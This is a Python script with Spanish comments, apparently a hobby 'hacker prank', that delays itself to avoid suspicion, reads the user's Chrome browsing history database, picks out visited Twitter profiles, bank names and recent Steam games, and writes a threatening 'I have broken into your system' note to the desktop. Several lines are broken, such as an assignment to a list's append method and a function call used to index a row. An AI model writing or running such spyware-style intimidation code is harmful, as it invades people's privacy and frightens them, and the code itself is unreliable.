import os
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re
import glob

HACKER_FILE_NAME = "PARA TI.txt"


def get_user_path():
    return "{}/".format(Path.home())


def check_steam_games(hacker_file):
    games = []
    steam_path = "C:/Program Files (x86)/Steam/steamapps/common/*"
    game_paths = glob.glob(steam_path)
    game_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in game_paths:
        games.append = game_path.split("/")[-1]
    hacker_file.write("He visto que has estado jugando ultimamente a {}... Hahaha...".format(", ".join(games[:3])))


def delay_action():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    n_hours = randrange(1, 4)
    n_minutes = randrange(0, 61)
    total_time = n_hours
    print(f"Durmiendo {n_hours} horas y {n_minutes} minutos")
    sleep(total_time)  # * 60 * 60)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "DESKTOP/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola, soy un hacker y me he colado en tu sistema. \n")
    return hacker_file


def gets_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Profile 1/History"
            temp_file = history_path + "temp"
            copyfile(history_path, temp_file)
            connection = sqlite3.connect(temp_file)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("HIstorial inaccesible, reintentado en 3 segundos...")
            sleep(3)


def check_twitter_profiles(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item(2))
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
        hacker_file.write("He visto que has estado husmeando en los perfiles de {} ...".format(", ".join(profiles_visited)))


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = []  # lista de bancos a buscar...
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
        hacker_file.write("\n Ademas veo que guardas tu dinero en {}... INTERESANTE".format(", ".join(his_bank)))


def main():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    delay_action()
    # Calaculamos la ruta del usuario de windows
    user_path = get_user_path()
    # Recogemos su historial de google chrome, cuando sea posible...
    chrome_history = gets_chrome_history(user_path)
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Escribieendo mensaje de miedo
    check_twitter_profiles(hacker_file, chrome_history)
    # Revisando los bankos
    check_bank_account(hacker_file, chrome_history)
    # Revisando juegos de Steam
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
